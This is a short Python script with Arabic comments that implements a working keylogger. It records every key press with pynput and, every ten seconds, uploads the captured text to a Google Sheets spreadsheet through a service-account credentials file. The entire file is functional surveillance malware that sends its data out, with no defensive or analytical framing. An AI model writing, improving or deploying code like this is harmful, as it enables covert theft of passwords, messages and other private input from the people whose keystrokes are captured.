import gspread
from oauth2client.service_account import ServiceAccountCredentials
import pynput.keyboard
import threading

# إعداد Google Sheets API
scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/drive']
try:
    creds = ServiceAccountCredentials.from_json_keyfile_name('credentials.json', scope)
    client = gspread.authorize(creds)
    print("تم الاتصال بـ Google Sheets API بنجاح.")
except Exception as e:
    print(f"حدث خطأ أثناء الاتصال بـ Google Sheets API: {e}")

# فتح ملف Google Sheets
try:
    sheet = client.open("report").sheet1  # تأكد من أن اسم الورقة صحيح
    print("تم فتح ملف Google Sheets بنجاح.")
except Exception as e:
    print(f"حدث خطأ أثناء فتح ملف Google Sheets: {e}")

log = ""  # تخزين ضغطات المفاتيح

def process_key_press(key):
    global log
    try:
        log += str(key.char)
        print(f"تم تسجيل ضغطة مفتاح: {log}")  # طباعة لضمان تسجيل ضغطات المفاتيح
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "
    except Exception as e:
        print(f"حدث خطأ أثناء تسجيل ضغطات المفاتيح: {e}")

def report():
    global log
    if log:
        try:
            # إرسال البيانات إلى Google Sheets
            sheet.append_row([log])
            print("تم إرسال البيانات إلى Google Sheets: ", log)
        except Exception as e:
            print(f"حدث خطأ أثناء إرسال البيانات إلى Google Sheets: {e}")
    log = ""  # إعادة تعيين سجل ضغطات المفاتيح
    timer = threading.Timer(10, report)  # الإرسال كل 10 ثوانٍ بدلاً من 60 لتسريع العملية
    timer.start()

from pynput import keyboard

# بدء الاستماع لضغطات المفاتيح
try:
    with keyboard.Listener(on_press=process_key_press) as listener:
        report()
        listener.join()
except Exception as e:
    print(f"حدث خطأ أثناء الاستماع لضغطات المفاتيح: {e}")
